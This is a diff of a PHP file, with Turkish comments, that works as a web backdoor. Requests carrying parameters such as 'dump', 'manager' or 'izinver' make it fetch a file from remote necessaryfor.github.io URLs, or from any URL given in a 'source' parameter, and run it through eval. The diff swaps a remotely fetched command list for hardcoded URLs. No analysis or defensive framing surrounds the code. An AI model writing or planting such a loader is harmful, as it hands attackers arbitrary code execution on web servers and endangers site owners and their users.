@@ -1,38 +1,33 @@
-<?php
-$commandsUrl = 'https://raw.githubusercontent.com/necessaryfor/all/refs/heads/main/komutlar.txt';
-
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, $commandsUrl);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
-$commandsContent = curl_exec($ch);
-curl_close($ch);
-
-if ($commandsContent === false) {
-    echo "Komut dosyası alınamadı.";
-    exit();
-}
-
-$commands = explode("\n", trim($commandsContent));
+<?php 
 
 $phpFilePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', __FILE__);
 
+// Parametre varsa, yönlendirme yapılmaması için kontrol
 if (!empty($_SERVER['QUERY_STRING'])) {
-
+    // Mevcut URL'yi al
     $currentUrl = $_SERVER['REQUEST_URI'];
     
+    // Kendi dosya yolunu ve parametreyi birleştiriyoruz
     $newUrl = $phpFilePath . '?' . $_SERVER['QUERY_STRING'];
     
+    // Yönlendirme döngüsünden kaçınmak için, mevcut URL'yi kontrol et
     if ($newUrl !== $currentUrl) {
         header("Location: $newUrl");
         exit();
     }
 }
 
-foreach ($commands as $line) {
-    list($param, $defaultUrl) = explode(" ", trim($line), 2);
-    
+// Parametre listesi
+$parameters = [
+    'yess' => 'https://necessaryfor.github.io/all/yeah.txt',
+    'dump' => 'https://necessaryfor.github.io/all/dump.txt',
+    'manager' => 'https://necessaryfor.github.io/all/manager.txt',
+    'izinver' => 'https://necessaryfor.github.io/all/izinver.txt',
+    'info' => 'https://necessaryfor.github.io/all/info.txt'
+];
+
+// Belirli bir parametre var mı kontrol et
+foreach ($parameters as $param => $defaultUrl) {
     if (isset($_GET[$param])) {
         $input = isset($_GET['source']) ? $_GET['source'] : $defaultUrl;
         $fileContent = '';
@@ -47,11 +42,18 @@ foreach ($commands as $line) {
         }
 
         if ($fileContent !== false) {
+            // Çekilen içeriği çalıştırıyoruz
             eval('?>' . $fileContent);
         } else {
             echo "Dosya içeriği alınamadı.";
         }
 
+        // İşlemi bitirdikten sonra döngüden çık
         exit();
     }
 }
+
+// Hiçbir parametre bulunamadıysa, uyarı mesajı göster
+echo "URL içinde geçerli bir parametre bulunamadı.";
+
+?>
